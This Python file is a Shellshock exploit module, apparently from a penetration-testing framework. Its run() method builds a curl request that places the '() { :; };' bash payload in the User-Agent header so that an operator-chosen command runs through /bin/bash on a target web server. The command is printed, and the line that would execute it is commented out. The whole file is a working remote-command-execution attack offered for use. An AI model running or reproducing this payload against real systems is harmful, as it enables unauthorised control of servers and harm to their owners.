from subprocess import run as execute
from modules.exploits.internal.base import Exploit
from sys import exit

class ShellShock(Exploit):
  def __init__(self):
    super().__init__()

    self.prompt = "[ShellShock] > "
    self.info = {
        "Author": "Alexis Rodriguez <binexisHATT>",
        "Author Repo": "http://github.com/binexisHATT",
        "Short Description":
        "An exploit for a web server vulnerable to the Shellshock vulnerability",
        "Long Description": "N/a",
        "Date Completed": "02/23/2021"
    }
    self.args = {
      "url" : "vulnerable target URL",
      "cmd" : "command to run on vulnerable target"
    }
    self.url = "N/a"
    self.cmd = "N/a"
	
  def run(self):
    exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
    exploit += '\'' + self.cmd + '\'"'
    exploit += ' ' + self.url
    print(exploit)

    #execute(exploit, shell=True)
